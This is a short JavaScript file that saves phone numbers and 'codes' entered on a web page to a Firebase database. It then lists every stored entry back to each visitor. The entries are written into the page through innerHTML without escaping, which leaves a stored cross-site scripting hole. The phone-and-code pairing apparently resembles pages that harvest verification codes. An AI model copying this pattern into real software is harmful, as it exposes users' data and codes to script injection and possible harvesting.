import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
  authDomain: "la3nazr.firebaseapp.com",
  databaseURL: "https://la3nazr-default-rtdb.firebaseio.com",
  projectId: "la3nazr",
  storageBucket: "la3nazr.firebasestorage.app",
  messagingSenderId: "819824551752",
  appId: "1:819824551752:web:87e8a2555c6df97edeb57d"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);


// ثبت اطلاعات
window.saveUser = function(){

let phone = document.getElementById("phone").value;
let code = document.getElementById("code").value;

if(phone==="" || code===""){
alert("اطلاعات را کامل کنید");
return;
}

push(ref(db,"users"),{
phone: phone,
code: code,
time: new Date().toLocaleString()
});

alert("ثبت شد");

};


// نمایش اطلاعات
onValue(ref(db,"users"),(snapshot)=>{

let box=document.getElementById("list");
box.innerHTML="";

snapshot.forEach((item)=>{

let data=item.val();

box.innerHTML += `
<div>
📱 ${data.phone}<br>
🔑 ${data.code}<br>
⏰ ${data.time}
<hr>
</div>
`;

});

});
